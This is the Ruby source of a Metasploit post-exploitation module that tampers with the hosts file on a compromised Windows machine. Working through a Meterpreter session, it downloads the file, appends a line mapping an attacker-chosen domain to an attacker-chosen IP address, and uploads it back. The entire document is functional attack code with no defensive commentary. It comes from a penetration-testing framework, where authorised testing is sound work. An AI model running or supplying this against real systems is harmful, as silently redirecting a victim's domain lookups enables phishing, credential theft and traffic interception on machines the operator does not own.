##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Hosts File Injection',
        'Description' => %q{
          This module allows the attacker to insert a new entry into the target
          system's hosts file.
        },
        'License' => BSD_LICENSE,
        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_tell
              core_channel_write
              stdapi_fs_stat
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
      OptString.new('IP', [ true, 'IP address to point domain name to.' ])
    ])
  end

  def run
    ip = datastore['IP']
    hostname = datastore['DOMAIN']

    if ip.blank? || hostname.blank?
      fail_with(Failure::BadConfig, 'Please specify both DOMAIN and IP.')
    end

    hosts_file_path = session.sys.config.getenv('SYSTEMROOT') + '\\System32\\drivers\\etc\\hosts'

    meterp_temp = Tempfile.new('meterp')
    meterp_temp.binmode
    temp_path = meterp_temp.path

    begin
      # Download the remote file to the temporary file
      client.fs.file.download_file(temp_path, hosts_file_path)
    rescue Rex::Post::Meterpreter::RequestError => e
      # If the file doesn't exist, then it's okay.  Otherwise, throw the error
      raise $ERROR_INFO unless e.result == 2
    end

    print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
    hostsfile = ::File.open(temp_path, 'ab')
    hostsfile.write("\r\n#{ip}\t#{hostname}")
    hostsfile.close

    client.fs.file.upload_file(hosts_file_path, temp_path)
    print_good('Done!')
  end
end
